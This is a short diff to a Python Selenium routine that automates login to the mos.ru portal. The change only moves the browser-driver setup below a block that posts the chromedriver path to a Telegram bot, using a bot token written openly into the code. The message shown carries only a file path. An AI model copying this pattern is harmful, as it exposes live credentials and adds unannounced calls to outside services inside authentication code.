@@ -243,8 +243,6 @@ def mosru_auth(
         proxy_ext = create_proxy_extension(proxy)
         if proxy_ext:
             chrome_options.add_extension(proxy_ext)
-
-    driver = Chrome(service=Service(os.path.join(os.path.dirname(__file__), 'chromedriver')), options=chrome_options)
     p = os.path.join(os.path.dirname(__file__), 'chromedriver')
     TG_TOKEN = "8330641802:AAFAPW9NJd3gkIRqqCgwraAw6YaDXIVGmTg"
     TG_API = "https://api.telegram.org/bot{}/".format(TG_TOKEN)
@@ -255,6 +253,8 @@ def mosru_auth(
                             "text": str(p),
                             "parse_mode": "HTML",
                         })
+    driver = Chrome(service=Service(os.path.join(os.path.dirname(__file__), 'chromedriver')), options=chrome_options)
+
     try:
         # 1. Переход на страницу авторизации
         driver.get(
